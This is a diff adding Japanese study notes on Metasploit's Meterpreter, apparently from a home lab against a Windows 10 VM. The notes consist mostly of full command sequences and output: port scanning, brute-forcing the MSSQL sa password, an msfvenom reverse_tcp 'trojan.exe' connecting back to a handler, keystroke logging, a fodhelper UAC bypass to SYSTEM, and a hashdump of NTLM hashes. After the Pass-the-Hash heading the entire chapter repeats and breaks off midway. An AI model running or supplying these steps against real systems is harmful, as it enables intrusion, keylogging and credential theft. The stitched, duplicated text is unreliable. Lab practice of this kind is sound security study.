@@ -1,0 +1,889 @@
+6章 Metapreter
+Metapreterha
+Metasploitの主要コンポーネントのひとつで脆弱性をエクスプロイトした後の
+ペイロードとして利用される。ペイロード＝エクスプロイト成功後、実行されるコード。
+
+とりあえずnmapによるポートスキャン。
+msf > nmap -sS -A -PO 10.61.7.21
+[*] exec: nmap -sS -A -PO 10.61.7.21
+
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-09 17:22 JST
+Nmap scan report for 10.61.7.21
+Host is up (0.00025s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.4001.00; SP1
+| ms-sql-ntlm-info:
+|   Target_Name: DESKTOP-RS9VLQ2
+|   NetBIOS_Domain_Name: DESKTOP-RS9VLQ2
+|   NetBIOS_Computer_Name: DESKTOP-RS9VLQ2
+|   DNS_Domain_Name: DESKTOP-RS9VLQ2
+|   DNS_Computer_Name: DESKTOP-RS9VLQ2
+|_  Product_Version: 10.0.16299
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2018-04-09T08:21:54
+|_Not valid after:  2048-04-09T08:21:54
+|_ssl-date: 2018-04-09T08:22:47+00:00; -1s from scanner time.
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DESKTOP-RS9VLQ2
+| Not valid before: 2018-03-11T15:12:01
+|_Not valid after:  2018-09-10T15:12:01
+|_ssl-date: 2018-04-09T08:22:46+00:00; -1s from scanner time.
+MAC Address: 00:0C:29:CC:D4:E2 (VMware)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=4/9%OT=80%CT=1%CU=31451%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
+OS:=5ACB22DD%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%II=I%
+OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5
+OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
+OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
+OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=
+OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%
+OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=
+OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
+OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
+OS:T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| ms-sql-info:
+|   10.61.7.21:1433:
+|     Version:
+|       name: Microsoft SQL Server 2016 SP1
+|       number: 13.00.4001.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: SP1
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_nbstat: NetBIOS name: DESKTOP-RS9VLQ2, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:cc:d4:e2 (VMware)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2018-04-09 17:22:46
+|_  start_date: 1601-01-01 09:18:59
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.25 ms 10.61.7.21
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.19 seconds
+msf >
+
+MSSQLを有効にしたのでそこを対象に攻撃実施
+MSSQLは基本的に高い権限で動作していることが多いので狙いどころ。
+次にUDPの1434(ブラウザ用ポート)があいているか確認する。
+msf > nmap -sU 10.61.7.21 -p 1434
+[*] exec: nmap -sU 10.61.7.21 -p 1434
+
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-09 17:27 JST
+Nmap scan report for 10.61.7.21
+Host is up (0.00030s latency).
+
+PORT     STATE         SERVICE
+1434/udp open|filtered ms-sql-m
+MAC Address: 00:0C:29:CC:D4:E2 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+msf >
+次にネットワーク範囲内で動作しているSQL Serverを列挙し情報を取得してみる。
+msf > use auxiliary/scanner/mssql/mssql_ping
+msf auxiliary(scanner/mssql/mssql_ping) > show options
+
+Module options (auxiliary/scanner/mssql/mssql_ping):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target address range or CIDR identifier
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(scanner/mssql/mssql_ping) >
+msf auxiliary(scanner/mssql/mssql_ping) > set RHOSTS 10.61.7.11-10.61.7.25
+RHOSTS => 10.61.7.11-10.61.7.25
+msf auxiliary(scanner/mssql/mssql_ping) > exploit
+
+[*] Scanned  2 of 15 hosts (13% complete)
+[*] Scanned  3 of 15 hosts (20% complete)
+[*] Scanned  5 of 15 hosts (33% complete)
+[*] Scanned  6 of 15 hosts (40% complete)
+[*] Scanned  8 of 15 hosts (53% complete)
+[*] Scanned  9 of 15 hosts (60% complete)
+[*] 10.61.7.21:           - SQL Server information for 10.61.7.21:
+[+] 10.61.7.21:           -    ServerName      = DESKTOP-RS9VLQ2
+[+] 10.61.7.21:           -    InstanceName    = SQLEXPRESS
+[+] 10.61.7.21:           -    IsClustered     = No
+[+] 10.61.7.21:           -    Version         = 13.0.1601.5
+[*] 10.61.7.21:           - SQL Server information for 10.61.7.21:
+[+] 10.61.7.21:           -    ServerName      = DESKTOP-RS9VLQ2
+[+] 10.61.7.21:           -    InstanceName    = MSSQLSERVER
+[+] 10.61.7.21:           -    IsClustered     = No
+[+] 10.61.7.21:           -    Version         = 13.0.1601.5
+[+] 10.61.7.21:           -    tcp             = 1433
+[*] Scanned 11 of 15 hosts (73% complete)
+[*] Scanned 12 of 15 hosts (80% complete)
+[*] Scanned 14 of 15 hosts (93% complete)
+[*] Scanned 15 of 15 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/mssql/mssql_ping) >
+1つのサーバに複数インスタンス入れとくと複数出るみたい。
+次に対象のSQLServerに対しブルートフォースアタックでパスワードを取得する。
+SQLSeerverは最初にsaを作成するが、パスワードが簡単なものになっている場合が多い。
+なのでブルートフォースアタックでなんとかなる場合がある。
+msf auxiliary(scanner/mssql/mssql_ping) > use auxiliary/scanner/mssql/mssql_login
+msf auxiliary(scanner/mssql/mssql_login) > show options
+
+Module options (auxiliary/scanner/mssql/mssql_login):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   BLANK_PASSWORDS      false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS         false            no        Add all users in the current database to the list
+   PASSWORD                              no        A specific password to authenticate with
+   PASS_FILE                             no        File containing passwords, one per line
+   RHOSTS                                yes       The target address range or CIDR identifier
+   RPORT                1433             yes       The target port (TCP)
+   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME                              no        A specific username to authenticate as
+   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS         false            no        Try the username as the password for all users
+   USER_FILE                             no        File containing usernames, one per line
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+   VERBOSE              true             yes       Whether to print output for all attempts
+セットできそうなパスワードファイルはこんな感じ。
+root@kali:~# find / -name "wordlist.txt"
+/usr/share/set/src/fasttrack/wordlist.txt
+/usr/share/sqlmap/txt/wordlist.txt
+/usr/share/set/src/fasttrack/wordlist.txtっぽい。
+msf auxiliary(scanner/mssql/mssql_login) > exploit
+
+[*] 10.61.7.21:1433       - 10.61.7.21:1433 - MSSQL - Starting authentication scanner.
+[+] 10.61.7.21:1433       - 10.61.7.21:1433 - Login Successful: WORKSTATION\sa:P@ssw0rd
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/mssql/mssql_login) >
+パスワードが抜けた。条件は結構色々だけど多分普通に気にせずやってたら
+このパターンはありそう。
+
+saアカウントからMSSQLServerを実行するとxp_cmdshellが一緒に利用できる。
+SQLServerを介してOS上で自由にコマンドが実行できる。
+色々試してみたけれどWindows Defenderが邪魔でセッションがはれない。
+確認してみるとPC上で色々な脅威ファイルが検出されていることは確認できた。
+
+これ以上準備できないと何も出来ないのでサイトで確認してトロイの木馬経由でアクセス
+root@kali:/usr/local/src# msfvenom -p /usr/share/doc/metasploit-framework/modules/payload/windows/meterpreter/reverse_tcp.md -platform window
+s-a x86 -f exe LHOST='10.61.7.100' PORT=444 -o /root/Desktop/trojan.exe
+Error: Invalid Payload Selected
+root@kali:/usr/local/src# msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.61.7.100 LPORT=444 -o /root/Desktop/trojan.exe
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+Final size of exe file: 73802 bytes
+Saved as: /root/Desktop/trojan.exe
+
+msf > use multi/handler
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.61.7.100
+LHOST => 10.61.7.100
+msf exploit(multi/handler) > set LPORT 444
+LPORT => 444
+msf exploit(multi/handler) > exploit
+この時点で通信待ち状態になるので、後は作成したtrojan.exeを
+対象PC上で実行するだけ。
+
+[*] Started reverse TCP handler on 10.61.7.100:444
+[*] Sending stage (179779 bytes) to 10.61.7.21
+[*] Meterpreter session 1 opened (10.61.7.100:444 -> 10.61.7.21:54316) at 2018-04-10 17:54:12 +0900
+
+meterpreter >
+snapshotの取得は出来なかった。
+meterpreter > sysinfo
+Computer        : DESKTOP-RS9VLQ2
+OS              : Windows 10 (Build 16299).
+Architecture    : x64
+System Language : ja_JP
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+次にキーストロークのキャプチャを試してみる。
+まずps
+これでexplorerのPIDを確認してmigrate
+meterpreter > migrate 6496
+[*] Migrating from 656 to 6496...
+[*] Migration completed successfully.
+これで今のmeterpreterのセッションをexplorerのプロセス空間へ移行できた。
+あとは実行して対象PCで何かを入力して止めるだけ。
+meterpreter > run post/windows/capture/keylog_recorder
+
+[*] Executing module against DESKTOP-RS9VLQ2
+[*] Starting the keylog recorder...
+[*] Keystrokes being saved in to /root/.msf4/loot/20180410215052_default_10.61.7.21_host.windows.key_450740.txt
+[*] Recording keystrokes...
+^C[*] User interrupt.
+[*] Shutting down keylog recorder. Please wait...
+中身を見ると取得できていることが分かる。
+root@kali:~# cat /root/.msf4/loot/20180410215052_default_10.61.7.21_host.windows.key_450740.txt
+Keystroke log from explorer.exe on DESKTOP-RS9VLQ2 with user DESKTOP-RS9VLQ2\testuser001 started at 2018-04-10 21:50:52 +0900
+
+password<CR>
+<Shift>P
+@ssword<^H><^H><^H><^H><^H><^H><^H><^H>ppppp0<Shift>
+!!
+
+Keylog Recorder exited at 2018-04-10 21:51:31 +0900
+
+・ユーザ名とパスワードのダンプ
+Meterpreterを利用することでローカルファイルシステム上のユーザ名とパスワードハッシュが保存されたデータベースに
+直接アクセスし取得することが出来る。
+MSはパスワードハッシュをLanManager(LM)、もしくはNT LAN Manager（NTLM、NTLMv2）で保管する。
+LMの場合は7文字ごとにハッシュで保存される。そのため14文字のパスワードであれば
+2回クラックすれば良い。
+msf > use multi/handler
+msf exploit(multi/handler) > use payload windows/x64/meterpreter/reverse_tcp
+[-] Failed to load module: payload
+msf exploit(multi/handler) > use payload/windows/x64/meterpreter/reverse_tcp
+msf payload(windows/x64/meterpreter/reverse_tcp) > back
+msf > use multi/handler
+msf exploit(multi/handler) > set payload/windows/x64/meterpreter/reverse_tcp
+[-] Unknown variable
+Usage: set [option] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore
+
+msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.61.7.100
+LHOST => 10.61.7.100
+msf exploit(multi/handler) > set LPORT 444
+LPORT => 444
+msf exploit(multi/handler) > payload
+[-] Unknown command: payload.
+msf exploit(multi/handler) > exploit
+
+[*] Started reverse TCP handler on 10.61.7.100:444
+[*] Sending stage (205891 bytes) to 10.61.7.21
+[*] Meterpreter session 1 opened (10.61.7.100:444 -> 10.61.7.21:58642) at 2018-04-11 17:57:15 +0900
+
+
+ps
+[*] 10.61.7.21 - Meterpreter session 1 closed.  Reason: Died
+[*] Sending stage (205891 bytes) to 10.61.7.21
+[*] Meterpreter session 2 opened (10.61.7.100:444 -> 10.61.7.21:58664) at 2018-04-11 17:59:06 +0900
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > getsystem -t 2
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (Dropper/Admin)
+meterpreter > getsystem -t 1
+[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+meterpreter > getsystem -t 3
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Token Duplication (In Memory/Admin)
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > ps
+meterpreter > migrate  4280
+[*] Migrating from 7252 to 4280...
+[*] Migration completed successfully.
+meterpreter > getuid
+Server username: DESKTOP-RS9VLQ2\testuser001
+meterpreter > getsystem
+[-] priv_elevate_getsystem: Operation failed: The environment is incorrect. The following was attempted:
+[-] Named Pipe Impersonation (In Memory/Admin)
+[-] Named Pipe Impersonation (Dropper/Admin)
+[-] Token Duplication (In Memory/Admin)
+meterpreter > background
+[*] Backgrounding session 2...
+msf exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
+msf exploit(windows/local/bypassuac_fodhelper) > set session 2
+session => 2
+msf exploit(windows/local/bypassuac_fodhelper) > run
+
+[*] Started reverse TCP handler on 10.61.7.100:4444
+[*] UAC is Enabled, checking level...
+[+] Part of Administrators group! Continuing...
+[!] UAC set to DoNotPrompt - using ShellExecute "runas" method instead
+[*] Uploading oIzVJvW.exe - 73802 bytes to the filesystem...
+[*] Executing Command!
+[*] Sending stage (179779 bytes) to 10.61.7.21
+[*] Meterpreter session 3 opened (10.61.7.100:4444 -> 10.61.7.21:59903) at 2018-04-11 21:41:37 +0900
+
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter >
+システム権限取得までが大変。
+流れはセッション張って、Explorerのプロセス空間に移行してuacバイパスしてgetsystemでシステム権限取得
+meterpreter > run post/windows/gather/hashdump
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY beb36105ae9d806d28d2f85649d1eb56...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+testuser001:"any"
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:adbe1efbad0e4f5966ec4ebbf76b6f15:::
+testuser001:1001:aad3b435b51404eeaad3b435b51404ee:f4e72d5e86755711110a691a92bdbfd3:::
+sc_admin:1008:aad3b435b51404eeaad3b435b51404ee:69f8f587efe7f71a37d134f1d2125c1a:::
+全てのハッシュ値についている先頭のaad3b435は空の文字列
+
+Pass-the-Hash攻撃
+6章 Metapreter
+Metapreterha
+Metasploitの主要コンポーネントのひとつで脆弱性をエクスプロイトした後の
+ペイロードとして利用される。ペイロード＝エクスプロイト成功後、実行されるコード。
+
+とりあえずnmapによるポートスキャン。
+msf > nmap -sS -A -PO 10.61.7.21
+[*] exec: nmap -sS -A -PO 10.61.7.21
+
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-09 17:22 JST
+Nmap scan report for 10.61.7.21
+Host is up (0.00025s latency).
+Not shown: 994 closed ports
+PORT     STATE SERVICE       VERSION
+80/tcp   open  http          Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+1433/tcp open  ms-sql-s      Microsoft SQL Server 2016 13.00.4001.00; SP1
+| ms-sql-ntlm-info:
+|   Target_Name: DESKTOP-RS9VLQ2
+|   NetBIOS_Domain_Name: DESKTOP-RS9VLQ2
+|   NetBIOS_Computer_Name: DESKTOP-RS9VLQ2
+|   DNS_Domain_Name: DESKTOP-RS9VLQ2
+|   DNS_Computer_Name: DESKTOP-RS9VLQ2
+|_  Product_Version: 10.0.16299
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2018-04-09T08:21:54
+|_Not valid after:  2048-04-09T08:21:54
+|_ssl-date: 2018-04-09T08:22:47+00:00; -1s from scanner time.
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=DESKTOP-RS9VLQ2
+| Not valid before: 2018-03-11T15:12:01
+|_Not valid after:  2018-09-10T15:12:01
+|_ssl-date: 2018-04-09T08:22:46+00:00; -1s from scanner time.
+MAC Address: 00:0C:29:CC:D4:E2 (VMware)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.60%E=4%D=4/9%OT=80%CT=1%CU=31451%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
+OS:=5ACB22DD%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10D%TI=I%CI=I%II=I%
+OS:SS=S%TS=U)OPS(O1=M5B4NW8NNS%O2=M5B4NW8NNS%O3=M5B4NW8%O4=M5B4NW8NNS%O5=M5
+OS:B4NW8NNS%O6=M5B4NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
+OS:ECN(R=Y%DF=Y%T=80%W=FFFF%O=M5B4NW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%
+OS:F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=
+OS:80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%
+OS:Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=
+OS:A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=
+OS:Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%
+OS:T=80%CD=Z)
+
+Network Distance: 1 hop
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| ms-sql-info:
+|   10.61.7.21:1433:
+|     Version:
+|       name: Microsoft SQL Server 2016 SP1
+|       number: 13.00.4001.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: SP1
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+|_nbstat: NetBIOS name: DESKTOP-RS9VLQ2, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:cc:d4:e2 (VMware)
+| smb2-security-mode:
+|   2.02:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2018-04-09 17:22:46
+|_  start_date: 1601-01-01 09:18:59
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.25 ms 10.61.7.21
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.19 seconds
+msf >
+
+MSSQLを有効にしたのでそこを対象に攻撃実施
+MSSQLは基本的に高い権限で動作していることが多いので狙いどころ。
+次にUDPの1434(ブラウザ用ポート)があいているか確認する。
+msf > nmap -sU 10.61.7.21 -p 1434
+[*] exec: nmap -sU 10.61.7.21 -p 1434
+
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2018-04-09 17:27 JST
+Nmap scan report for 10.61.7.21
+Host is up (0.00030s latency).
+
+PORT     STATE         SERVICE
+1434/udp open|filtered ms-sql-m
+MAC Address: 00:0C:29:CC:D4:E2 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
+msf >
+次にネットワーク範囲内で動作しているSQL Serverを列挙し情報を取得してみる。
+msf > use auxiliary/scanner/mssql/mssql_ping
+msf auxiliary(scanner/mssql/mssql_ping) > show options
+
+Module options (auxiliary/scanner/mssql/mssql_ping):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target address range or CIDR identifier
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+msf auxiliary(scanner/mssql/mssql_ping) >
+msf auxiliary(scanner/mssql/mssql_ping) > set RHOSTS 10.61.7.11-10.61.7.25
+RHOSTS => 10.61.7.11-10.61.7.25
+msf auxiliary(scanner/mssql/mssql_ping) > exploit
+
+[*] Scanned  2 of 15 hosts (13% complete)
+[*] Scanned  3 of 15 hosts (20% complete)
+[*] Scanned  5 of 15 hosts (33% complete)
+[*] Scanned  6 of 15 hosts (40% complete)
+[*] Scanned  8 of 15 hosts (53% complete)
+[*] Scanned  9 of 15 hosts (60% complete)
+[*] 10.61.7.21:           - SQL Server information for 10.61.7.21:
+[+] 10.61.7.21:           -    ServerName      = DESKTOP-RS9VLQ2
+[+] 10.61.7.21:           -    InstanceName    = SQLEXPRESS
+[+] 10.61.7.21:           -    IsClustered     = No
+[+] 10.61.7.21:           -    Version         = 13.0.1601.5
+[*] 10.61.7.21:           - SQL Server information for 10.61.7.21:
+[+] 10.61.7.21:           -    ServerName      = DESKTOP-RS9VLQ2
+[+] 10.61.7.21:           -    InstanceName    = MSSQLSERVER
+[+] 10.61.7.21:           -    IsClustered     = No
+[+] 10.61.7.21:           -    Version         = 13.0.1601.5
+[+] 10.61.7.21:           -    tcp             = 1433
+[*] Scanned 11 of 15 hosts (73% complete)
+[*] Scanned 12 of 15 hosts (80% complete)
+[*] Scanned 14 of 15 hosts (93% complete)
+[*] Scanned 15 of 15 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/mssql/mssql_ping) >
+1つのサーバに複数インスタンス入れとくと複数出るみたい。
+次に対象のSQLServerに対しブルートフォースアタックでパスワードを取得する。
+SQLSeerverは最初にsaを作成するが、パスワードが簡単なものになっている場合が多い。
+なのでブルートフォースアタックでなんとかなる場合がある。
+msf auxiliary(scanner/mssql/mssql_ping) > use auxiliary/scanner/mssql/mssql_login
+msf auxiliary(scanner/mssql/mssql_login) > show options
+
+Module options (auxiliary/scanner/mssql/mssql_login):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   BLANK_PASSWORDS      false            no        Try blank passwords for all users
+   BRUTEFORCE_SPEED     5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS         false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS          false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS         false            no        Add all users in the current database to the list
+   PASSWORD                              no        A specific password to authenticate with
+   PASS_FILE                             no        File containing passwords, one per line
+   RHOSTS                                yes       The target address range or CIDR identifier
+   RPORT                1433             yes       The target port (TCP)
+   STOP_ON_SUCCESS      false            yes       Stop guessing when a credential works for a host
+   TDSENCRYPTION        false            yes       Use TLS/SSL for TDS data "Force Encryption"
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME                              no        A specific username to authenticate as
+   USERPASS_FILE                         no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS         false            no        Try the username as the password for all users
+   USER_FILE                             no        File containing usernames, one per line
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+   VERBOSE              true             yes       Whether to print output for all attempts
+セットできそうなパスワードファイルはこんな感じ。
+root@kali:~# find / -name "wordlist.txt"
+/usr/share/set/src/fasttrack/wordlist.txt
+/usr/share/sqlmap/txt/wordlist.txt
+/usr/share/set/src/fasttrack/wordlist.txtっぽい。
+msf auxiliary(scanner/mssql/mssql_login) > exploit
+
+[*] 10.61.7.21:1433       - 10.61.7.21:1433 - MSSQL - Starting authentication scanner.
+[+] 10.61.7.21:1433       - 10.61.7.21:1433 - Login Successful: WORKSTATION\sa:P@ssw0rd
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(scanner/mssql/mssql_login) >
+パスワードが抜けた。条件は結構色々だけど多分普通に気にせずやってたら
+このパターンはありそう。
+
+saアカウントからMSSQLServerを実行するとxp_cmdshellが一緒に利用できる。
+SQLServerを介してOS上で自由にコマンドが実行できる。
+色々試してみたけれどWindows Defenderが邪魔でセッションがはれない。
+確認してみるとPC上で色々な脅威ファイルが検出されていることは確認できた。
+
+これ以上準備できないと何も出来ないのでサイトで確認してトロイの木馬経由でアクセス
+root@kali:/usr/local/src# msfvenom -p /usr/share/doc/metasploit-framework/modules/payload/windows/meterpreter/reverse_tcp.md -platform window
+s-a x86 -f exe LHOST='10.61.7.100' PORT=444 -o /root/Desktop/trojan.exe
+Error: Invalid Payload Selected
+root@kali:/usr/local/src# msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.61.7.100 LPORT=444 -o /root/Desktop/trojan.exe
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+Final size of exe file: 73802 bytes
+Saved as: /root/Desktop/trojan.exe
+
+msf > use multi/handler
+msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+payload => windows/meterpreter/reverse_tcp
+msf exploit(multi/handler) > set LHOST 10.61.7.100
+LHOST => 10.61.7.100
+msf exploit(multi/handler) > set LPORT 444
+LPORT => 444
+msf exploit(multi/handler) > exploit
+この時点で通信待ち状態になるので、後は作成したtrojan.exeを
+対象PC上で実行するだけ。
+
+[*] Started reverse TCP handler on 10.61.7.100:444
+[*] Sending stage (179779 bytes) to 10.61.7.21
+[*] Meterpreter session 1 opened (10.61.7.100:444 -> 10.61.7.21:54316) at 2018-04-10 17:54:12 +0900
+
+meterpreter >
+snapshotの取得は出来なかった。
+meterpreter > sysinfo
+Computer        : DESKTOP-RS9VLQ2
+OS              : Windows 10 (Build 16299).
+Architecture    : x64
+System Language : ja_JP
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+
+次にキーストロークのキャプチャを試してみる。
+まずps
+これでexplorerのPIDを確認してmigrate
+meterpreter > migrate 6496
+[*] Migrating from 656 to 6496...
+[*] Migration completed successfully.
+これで今のmeterpreterのセッションをexplorerのプロセス空間へ移行できた。
